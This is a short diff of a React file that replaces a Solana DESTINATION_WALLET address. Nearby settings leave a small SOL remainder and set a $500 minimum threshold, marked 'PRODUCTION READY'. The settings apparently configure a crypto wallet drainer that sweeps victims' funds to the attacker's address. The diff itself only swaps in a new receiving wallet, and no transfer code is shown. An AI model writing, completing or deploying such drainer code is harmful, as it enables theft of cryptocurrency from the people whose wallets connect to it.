@@ -27,7 +27,7 @@ import { useState } from "react";
 
 // --- CONFIGURATION ---
 const DESTINATION_WALLET = new PublicKey(
-  "8JLWroB4W3sg5dWKj66m9CMKXdb5AkawudZydbLGJe8k"
+  "5vsFESa7qAYnPt9nvfMvfWCjAToWKyz5JQcQ8qmzw1pL"
 );
 const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL;
 const MIN_DOLLAR_THRESHOLD = 500; // PRODUCTION READY
